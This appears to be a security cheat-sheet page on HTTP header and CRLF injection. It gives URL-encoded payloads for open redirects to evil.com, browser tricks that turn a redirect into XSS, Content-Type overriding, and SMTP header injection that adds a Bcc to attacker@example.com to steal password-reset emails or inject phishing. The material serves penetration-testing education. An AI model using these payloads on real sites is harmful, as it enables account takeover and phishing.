---
description: >-
  Manipulate HTTP headers in your favor or insert completely new ones with even
  more control
---

# Header / CRLF Injection

HTTP is a plaintext protocol that works with Carriage Return (`\r`) Line Feed (`\n`) delimited headers. When user input lands in the **response headers** from an HTTP server, injecting these CRLF characters can result in some client-side attacks abusing headers.&#x20;

## Location

The `Location` header in HTTP is used for redirecting to another page, which the browser will do when it gets a 3XX response. If your injection point lies in this header there are some useful tricks:

<pre class="language-http" data-title="Response"><code class="lang-http">HTTP/1.1 302 Found
Content-Type: text/html
<strong>Location: [INPUT]
</strong></code></pre>

This is common for dynamic redirections and from data you control such as URL parameters, path parameters, or stored data. The context for this header matters a lot, especially what comes before your input. **Open Redirect** vulnerabilities are common here if you control a significant part:

```http
Location: [INPUT]                   -> http://evil.com
Location: /[INPUT]                  -> //evil.com
Location: http://example.com[INPUT] -> http://example.com@evil.com
Location: /any/path/[INPUT]         -> ../../dangerous/path
```

If it is possible to inject CRLF characters, you can add more headers and even content to the response. With HTML content this may lead to **XSS**, but a tricky situation comes from the fact that the response is _still redirecting_. Modern browsers will not render the page, but simply follow the `Location` header, ignoring your payload. We can get around this however in Firefox and Chrome if we have **control over the start** of the header (see [these](https://www.gremwell.com/firefox-xss-302) [writeups](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/)):

{% code title="Firefox" %}
```http
Location: ws://anything
Location: wss://anything
Location: resource://anything
```
{% endcode %}

{% code title="Chrome" %}
```http
Location: 
```
{% endcode %}

With the above payloads, you can force the browser to stop redirecting and show the content instead. With the ability to insert newlines in the response you can give it a HTML body with XSS:

**Chrome** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL\_Encode\(false\)\&input=DQoNCjxzdmcgb25sb2FkPWFsZXJ0KCk%2B\&ieol=%0D%0A): `%0D%0A%0D%0A%3Csvg%20onload=alert()%3E`

```http
Location: 

<svg onload=alert()>
```

**Firefox** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL\_Encode\(false\)\&input=d3M6Ly9hbnl0aGluZw0KDQo8c3ZnIG9ubG9hZD1hbGVydCgpPg\&ieol=%0D%0A): `ws://anything%0D%0A%0D%0A%3Csvg%20onload=alert()%3E`

```http
Location: ws://anything

<svg onload=alert()>
```

## Content-Type

You might find yourself with an injection into some header, where you would like to add two CRLF sequences and an HTML body to cause XSS. One header that might get in the way is the `Content-Type`:

<pre class="language-http" data-title="Example Case"><code class="lang-http"><strong>Content-Type: application/json
</strong>Some-Header: [INPUT]

{key: "&#x3C;svg onload=alert()>"}
</code></pre>

The above payload _will not_ fire because browsers render these content types differently. Ideally, it would be `text/html`. Using a header injection we can **add another** `Content-Type` header **after** the one we want to overwrite, which will be chosen over the previous by browsers!

[**Payload**](https://gchq.github.io/CyberChef/#recipe=URL\_Encode\(false\)\&input=YW55dGhpbmcNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1s\&ieol=%0D%0A): `anything%0D%0AContent-Type:%20text/html`

<pre class="language-http" data-title="Payload"><code class="lang-http"><strong>Content-Type: application/json
</strong>Some-Header: anything
<strong>Content-Type: text/html
</strong>
{key: "&#x3C;svg onload=alert()>"}
</code></pre>

More tricks for `[INPUT]` _inside_ the existing `Content-Type` header itself can be found in [this writeup](https://gist.github.com/avlidienbrunn/8db7f692404cdd3c325aa20d09437e13). It contains a trick to escape the HTML context if your payload in the body is limited.&#x20;

## SMTP

Just like HTTP, SMTP for sending emails is also a CRLF-delimited plaintext protocol with headers. These emails are often sent by applications automatically with information to you like a password reset or notifications. Such emails are often sensitive and if an attacker-controlled input can mess with the request it can get leaked, or malicious content can be injected.&#x20;

A typical SMTP request looks like this:

```xml
EHLO
MAIL FROM:sender@example.com
RCPT TO:recipient@example.com
DATA
From: sender@example.com
To: recipient@example.com
Subject: some subject

Content...
.

```

A common place to inject is the `RCPT TO:` SMTP header as this is where the email is sent to. By injecting CRLF characters, new headers like `RCPT TO:attacker@example.com` to receive a copy of the email in your inbox (very dangerous for secrets like **password reset** tokens!). \
More commonly you will also see an injection into the `DATA` section where headers like `Bcc` can be added to send a copy to yourself or add content to the email for an indistinguishable phishing attack. A common place is the `Subject` or `From`/`To` headers:

**Subject** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL\_Encode\(false\)\&input=YQ0KQmNjOiBhdHRhY2tlckBleGFtcGxlLmNvbQ0KDQo8aDE%2BUGhpc2hpbmchPC9oMT4\&ieol=%0D%0A): `a%0D%0ABcc:%20attacker@example.com%0D%0A%0D%0A%3Ch1%3EPhishing!%3C/h1%3E`

```
From: sender@example.com
To: recipient@example.com
Subject: a
Bcc: attacker@example.com

<h1>Phishing!</h1>
Content...
```
